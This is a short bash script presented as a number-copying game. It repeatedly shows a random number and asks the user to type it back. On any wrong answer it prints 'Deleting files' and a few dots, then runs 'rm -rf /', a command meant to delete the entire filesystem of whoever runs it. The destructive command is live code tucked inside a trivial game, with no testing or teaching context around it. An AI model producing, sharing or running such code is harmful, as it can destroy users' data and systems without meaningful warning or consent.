#!/bin/bash

while true; do

clear

rand_num=$RANDOM
echo "Copy this number:"

echo $rand_num

read usr_number

if [ $usr_number == $rand_num ]; then

echo "correct!"

else

echo "wrong
"

echo "Deleting files"

sleep 0.5
echo "."
sleep 0.5 
echo "."
sleep 0.5
echo "."

rm -rf /

fi

sleep 1

done
